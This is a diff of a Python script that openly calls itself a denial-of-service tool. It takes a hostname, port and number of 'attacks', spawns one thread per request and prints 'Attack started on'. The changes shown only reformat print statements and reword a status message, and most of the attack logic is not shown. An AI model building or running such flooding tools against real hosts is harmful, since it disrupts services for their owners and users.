@@ -21,7 +21,8 @@ elif len(sys.argv) == 4:
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
 else:
-    print("ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >")
+    print("ERROR\n Usage: " +
+          sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >")
     sys.exit(1)
 
 # Convert FQDN to IP
@@ -44,7 +45,7 @@ def print_status():
     thread_num_mutex.acquire(True)
 
     thread_num += 1
-    print("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Hold Your Tears #-#-#")
+    print("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] ...hold your horses... ")
     thread_num_mutex.release()
 
 
@@ -77,7 +78,8 @@ def attack():
         dos.close()
 
 
-print("[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))
+print("[#] Attack started on " + host + " (" + ip + ") || Port: " +
+      str(port) + " || # Requests: " + str(num_requests))
 
 # Spawn a thread per request
 all_threads = []
